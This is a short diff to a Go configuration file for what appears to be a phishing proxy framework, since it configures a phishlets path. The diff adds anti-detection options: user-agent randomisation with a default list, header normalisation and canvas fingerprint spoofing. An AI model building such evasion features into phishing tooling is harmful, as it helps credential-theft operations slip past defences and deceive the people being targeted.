@@ -66,6 +66,12 @@ type Config struct {
 	APIEnabled bool   `mapstructure:"api_enabled"`
 	APIPort    int    `mapstructure:"api_port"`
 	APIKey     string `mapstructure:"api_key"`
+
+	// Anti‑detection / fingerprinting
+	RandomizeUserAgent bool     `mapstructure:"randomize_user_agent"`
+	UserAgents         []string `mapstructure:"user_agents"`
+	NormalizeHeaders    bool     `mapstructure:"normalize_headers"`
+	CanvasSpoofEnabled bool     `mapstructure:"canvas_spoof_enabled"`
 	
 	// Логирование
 	Debug            bool   `mapstructure:"debug"`
@@ -198,6 +204,15 @@ func setDefaults() {
 	viper.SetDefault("database_type", "sqlite")
 	
 	viper.SetDefault("phishlets_path", "./configs/phishlets")
+
+	// anti‑detection defaults
+	viper.SetDefault("randomize_user_agent", false)
+	viper.SetDefault("user_agents", []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
+		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+	})
+	viper.SetDefault("normalize_headers", true)
 	
 	viper.SetDefault("ja3_enabled", true)
 	viper.SetDefault("ml_detection", false)
